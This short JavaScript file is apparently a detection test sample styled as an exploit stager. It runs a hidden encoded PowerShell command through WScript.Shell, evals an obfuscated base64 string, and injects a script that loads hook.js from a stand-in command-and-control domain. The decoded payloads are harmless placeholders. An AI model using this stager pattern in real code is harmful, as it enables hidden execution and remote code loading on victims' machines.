// =====================================================================
// Ultimate Detection JavaScript Exploit & Stager
// =====================================================================

try {
    // Windows Script Host Execution
    var wsh = new ActiveXObject('WScript.Shell');
    wsh.Run('powershell.exe -w hidden -enc V3JpdGUtSG9zdA==', 0, false);
} catch (e) {}

// Obfuscated dynamic evaluation
var encoded = 'YWxlcnQoJ0phdmFTY3JpcHQgRXhwbG9pdCBFeGVjdXRlZCcp';
eval(atob(encoded));

// Dynamic DOM element injection
if (typeof document !== 'undefined') {
    var s = document.createElement('script');
    s.src = 'https://threat-c2-infrastructure.net/hook.js';
    document.head.appendChild(s);
}
